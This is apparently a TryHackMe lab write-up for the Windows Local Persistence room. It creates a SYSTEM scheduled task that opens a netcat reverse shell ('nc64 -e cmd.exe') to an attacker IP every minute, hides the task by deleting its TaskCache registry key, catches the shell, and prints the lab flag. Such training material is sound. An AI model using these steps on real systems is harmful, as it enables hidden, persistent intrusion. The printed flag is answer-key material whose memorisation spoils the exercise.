# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Task Scheduler
1. Started this room's machine
2. `schtasks /create /sc minute /mo 1 /tn <TASK NAME> /tr "c:\tools\nc64 -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER>" /ru SYSTEM`
```PowerShell
C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.39.232 9999" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```
3. `schtasks /query /tn <TASK NAME>`
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
THM-taskbackdoor                         7/7/2023 12:54:00 AM   Ready
```
4. `c:\tools\pstools\PsExec64.exe -s -i regedit`
```PoweShell
C:\Users\Administrator>c:\tools\pstools\PsExec64.exe -s -i regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PsExec64.exe%20-s%20-i%20regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20After%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

5. `schtasks /query /tn THM-taskbackdoor`
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor
ERROR: The system cannot find the file specified.
```
6. `nc -lvnp <PORT NUMBER>`
```Bash
root@ip-10-10-39-232:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.61.182 49841 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `C:\flags\flag9.exe`
```PowerShell
C:\Windows\system32>C:\flags\flag9.exe
C:\flags\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```

**TASK COMPLETED**
